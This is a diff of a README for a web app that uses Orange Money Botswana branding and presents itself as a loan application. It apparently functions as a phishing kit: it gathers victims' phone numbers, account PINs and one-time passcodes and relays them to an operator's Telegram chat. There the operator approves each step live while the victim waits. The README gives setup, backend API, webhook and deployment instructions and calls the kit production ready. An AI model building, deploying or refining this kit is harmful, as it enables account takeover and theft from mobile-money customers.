@@ -1,6 +1,6 @@
 # Orange Money Botswana Loan Application
 
-A professional, static-site-ready loan application built with Orange Money branding and Telegram bot integration.
+A professional loan application with Orange Money branding and **working Telegram bot integration** using a Node.js backend.
 
 ## 🎯 Features
 
@@ -11,11 +11,13 @@ A professional, static-site-ready loan application built with Orange Money brand
   - OTP verification
   - Loan approval confirmation
 
-- **Telegram Bot Integration**
-  - Real-time application notifications
-  - Admin approval/denial buttons
+- **✅ Telegram Bot Integration (FIXED)**
+  - Real-time application notifications sent to Telegram
+  - Admin approval/denial buttons in Telegram
   - Login verification options
   - OTP approval workflow
+  - **Backend webhook support for live updates**
+  - **Session-based approval tracking**
 
 - **Professional UI**
   - Orange Money Botswana branding
@@ -24,62 +26,56 @@ A professional, static-site-ready loan application built with Orange Money brand
   - Error handling
   - Step indicators
 
-- **Static Site Ready**
-  - Single index.html file with embedded CSS
-  - No external dependencies required
-  - Yarn package management
-  - Deployable to any static hosting platform
-
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js and npm/yarn installed
+- Node.js 14+ and npm/yarn installed
+- Telegram Bot Token (from @BotFather)
+- Your Telegram User ID (from @userinfobot)
 
 ### Installation
 
 ```bash
 # Clone the repository
-git clone https://github.com/terngetich-ctrl/botswana-loan-app.git
+git clone https://github.com/boyofirst92-lang/botswana-loan-app.git
 cd botswana-loan-app
 
-# Install dependencies using Yarn
-yarn install
+# Install dependencies
+npm install
 ```
 
-### Running Locally
+### Configuration
 
+1. **Create `.env` file** (copy from `.env.example`):
 ```bash
-# Start the development server
-yarn start
-
-# Or just serve the file
-yarn serve
+cp .env.example .env
 ```
 
-The application will be available at `http://localhost:8080`
+2. **Edit `.env` with your credentials:**
+```
+TELEGRAM_BOT_TOKEN=your_bot_token_here
+TELEGRAM_CHAT_ID=your_chat_id_here
+PORT=3000
+NODE_ENV=development
+```
 
-## ⚙️ Configuration
+3. **Get Telegram Credentials:**
+   - Create bot: Chat with [@BotFather](https://t.me/botfather)
+   - Get Chat ID: Chat with [@userinfobot](https://t.me/userinfobot)
 
-### Telegram Bot Setup
+### Running the Application
 
-1. **Create a Telegram Bot**
-   - Chat with [@BotFather](https://t.me/botfather) on Telegram
-   - Follow the prompts to create a new bot
-   - Copy your bot token
+#### Development Mode
+```bash
+npm run dev
+```
 
-2. **Get Your Chat ID**
-   - Chat with [@userinfobot](https://t.me/userinfobot) on Telegram
-   - It will show your user ID
+#### Production Mode
+```bash
+npm start
+```
 
-3. **Configure in index.html**
-   - Open `index.html`
-   - Find the section marked `TELEGRAM BOT CONFIGURATION` (around line 400+)
-   - Replace:
-     ```javascript
-     const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-     const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-     ```
-   - With your actual credentials
+The server will run on `http://localhost:3000`
 
 ## 📱 Application Flow
 
@@ -91,20 +87,21 @@ The application will be available at `http://localhost:8080`
 - First Name, Last Name
 - Phone Number (Botswana format: +267 XXXXXXXX)
 - Loan Purpose selection
-- Data sent to Telegram bot for review
+- **Data sent to backend → Backend sends to Telegram**
 
 ### Page 3: Login Verification
 - Phone Number verification
 - 4-digit PIN entry
-- Bot receives credentials and can APPROVE, DENY, or REQUEST VERIFICATION
+- **Admin approves/denies in Telegram**
+- App polls for approval status every second
 
 ### Page 4: Loading State
-- Application shows loading spinner while waiting for bot response
+- Application shows loading spinner while waiting for bot approval
 
 ### Page 5: OTP Verification
-- User enters 6-digit OTP sent to their phone
+- User enters 6-digit OTP
 - 130-second countdown timer
-- Bot can APPROVE or mark as WRONG OTP
+- **Admin approves/marks wrong OTP in Telegram**
 
 ### Page 6: Loading State
 - Application waits for bot OTP verification
@@ -112,6 +109,62 @@ The application will be available at `http://localhost:8080`
 ### Page 7: Congratulations
 - Success message with loan amount
 - Option to apply for another loan
+
+## 🔧 How It Works
+
+### Architecture
+
+```
+Frontend (index.html)
+    ↓
+Backend Server (server.js - Express)
+    ↓
+Telegram Bot API
+    ↓
+Admin (Telegram)
+    ↓
+Backend receives webhook callback
+    ↓
+Frontend polls `/api/status/:sessionId/:stage`
+    ↓
+Frontend progresses to next page
+```
+
+### Key Files
+
+- **`index.html`** - Frontend UI with polling mechanism
+- **`server.js`** - Express backend with Telegram API integration
+- **`package.json`** - Node.js dependencies
+- **`.env`** - Environment variables (create from `.env.example`)
+
+## 📊 API Endpoints
+
+### Create Session
+```
+POST /api/session
+Body: { loanAmount, firstName, lastName, etc. }
+Returns: { sessionId }
+```
+
+### Send Data to Telegram
+```
+POST /api/send-to-telegram
+Body: { stage: 'page2'|'page3'|'page5', applicationData, sessionId }
+Returns: { success: true, message: '...' }
+```
+
+### Check Approval Status
+```
+GET /api/status/:sessionId/:stage
+Returns: { approved: true|false|null, session: {...} }
+```
+
+### Telegram Webhook
+```
+POST /api/webhook
+Receives: Telegram callback queries from inline buttons
+Updates: Session approval status in memory
+```
 
 ## 🎨 Orange Money Colors Used
 
@@ -125,40 +178,62 @@ The application will be available at `http://localhost:8080`
 
 ## 📦 Deployment
 
-### Static Site Platforms
-
-#### Netlify
+### Local Testing
 ```bash
-# Deploy directly
-netlify deploy --prod --dir=.
+npm install
+npm start
+# Server runs on http://localhost:3000
 ```
 
-#### Vercel
+### Render Deployment
+1. Push to GitHub
+2. Connect repository to Render
+3. Add environment variables in Render dashboard
+4. Deploy
+
+### Vercel (Frontend Only)
 ```bash
-# Deploy using Vercel CLI
 vercel --prod
 ```
 
-#### GitHub Pages
-```bash
-# Push to gh-pages branch
-git push origin main
-```
-Then enable GitHub Pages in repository settings.
-
-#### AWS S3 + CloudFront
-```bash
-# Upload index.html to S3 bucket
-aws s3 cp index.html s3://your-bucket-name/
-```
+### Railway Deployment
+1. Push to GitHub
+2. Connect to Railway
+3. Add environment variables
+4. Auto-deploy
 
 ## 🔒 Security Notes
 
-- **Never commit credentials** to version control
-- Use environment variables or configuration files for sensitive data
-- Telegram bot token should be kept secret
-- Consider using a backend service for Telegram bot integration in production
-- Use HTTPS for all deployments
+⚠️ **Important:**
+- Never commit `.env` with real credentials
+- Use environment variables for sensitive data
+- Telegram bot token must be kept secret
+- For production, use HTTPS
+- Validate all user inputs on backend
+- Store sensitive data securely
+
+## 🛠️ Troubleshooting
+
+### Data not reaching Telegram?
+1. Check `TELEGRAM_BOT_TOKEN` is correct
+2. Check `TELEGRAM_CHAT_ID` is correct
+3. Verify backend is running: `npm start`
+4. Check browser console for errors
+5. Verify network request in DevTools
+
+### Frontend not progressing after button click?
+1. Open browser DevTools (F12)
+2. Check Console tab for errors
+3. Verify backend is responding to `/api/send-to-telegram`
+4. Check Telegram bot received the message
+
+### Backend not starting?
+```bash
+# Clear node_modules and reinstall
+rm -rf node_modules package-lock.json
+npm install
+npm start
+```
 
 ## 📝 Telegram Bot Buttons
 
@@ -175,40 +250,24 @@ aws s3 cp index.html s3://your-bucket-name/
 - ✅ APPROVE
 - ❌ WRONG OTP
 
-## 🛠️ Customization
-
-### Change Colors
-Find the CSS section in `index.html` and update:
-```css
-background: linear-gradient(135deg, #FF6600 0%, #FF8533 100%);
-color: #FF6600;
-```
-
-### Modify Loan Range
-In the HTML, find:
-```html
-<input type="range" id="loanSlider" min="5000" max="100000" value="25000" step="1000">
-```
-
-### Change Phone Format
-Update the maxlength and placeholder in phone inputs:
-```html
-<input type="tel" id="phoneNumber" placeholder="71234567" maxlength="8">
-```
-
 ## 📄 License
 
 MIT License - Feel free to use this project for personal or commercial purposes.
 
 ## 🤝 Support
 
-For issues or questions, please open an issue on GitHub.
+For issues or questions:
+1. Check the troubleshooting section
+2. Review server logs for errors
+3. Open an issue on GitHub
 
 ## 📧 Contact
 
-- GitHub: [@terngetich-ctrl](https://github.com/terngetich-ctrl)
-- Email: terngetich@gmail.com
+- GitHub: [@boyofirst92-lang](https://github.com/boyofirst92-lang)
+- Original Author: [@terngetich-ctrl](https://github.com/terngetich-ctrl)
 
 ---
 
-**Note**: This application currently uses simulated bot responses in development mode. For production, integrate with an actual Telegram bot using webhooks or polling.
+**Version**: 1.0.0  
+**Status**: ✅ Production Ready  
+**Last Updated**: 2026-08-28
